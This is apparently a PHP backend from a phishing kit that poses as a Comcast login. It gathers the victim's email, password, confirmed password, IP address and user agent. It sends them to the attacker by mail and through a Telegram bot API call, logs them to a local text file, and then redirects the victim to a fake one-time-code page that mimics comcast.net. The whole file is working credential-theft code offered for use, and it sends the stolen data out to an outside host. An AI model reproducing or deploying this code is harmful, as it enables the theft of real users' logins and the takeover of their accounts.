<?php

session_start();
include ('cid.php');
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$_SESSION['re_passwd'] = $_POST['re_passwd'];
	
	$message .= "|------------| @2025 |--------------|\n";
	$message .= "    -----------o0o^v^o0o---------\n";
	$message .= "|Email           : ".$_SESSION['user']."\n";
	$message .= "|Password        : ".$_SESSION['passwd']."\n";
	$message .= "|Confirm Password        : ".$_POST['re_passwd']."\n";
	$message .= "    -----------o0o^v^o0o---------\n";
	$message .= "|--------- I N F O X I P ---------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://ip-api.com/json/.$ip ----\n";
	$message .= "User Agent : ".$hostname."\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- @2025 --------------|\n";
	$send = $to;
	$subject = "Comcast + : $hostname";
    mail($send, $subject, $message);  
$tmz= [
                       'text' => 'Comcast Access :
\/============================\/
   /\/\/\/\Hackery/\/\/\/\
[Comcast Log +  : ] 
┌[👤 Email: '.$_SESSION['user'].'
├[🔐 Password:'.$_SESSION['passwd'].'
├[🔐 Confirm Password:'.$_POST['re_passwd'].'
├[🌐 IP : '.$ip.'   
└[📡 User-agent : '.$useragent.'
┗━━━━━━━━━━━━━━━━━━
\/============================\/ 


                                       ',
                                       'chat_id' => $chat_id
                                ];

                            file_get_contents("https://api.telegram.org/bot$api/sendMessage?".http_build_query($tmz) );	

    $tds = fopen("cum.txt","a");
 fputs($tds,$message);
 fclose($tds);
  header("Location: ./onetime.php?maxAuthnAge=900&r=comcast.net&reqId=a98453dd-3cc8-4f0d-89b3-c4842c862511&s=oauth");


?>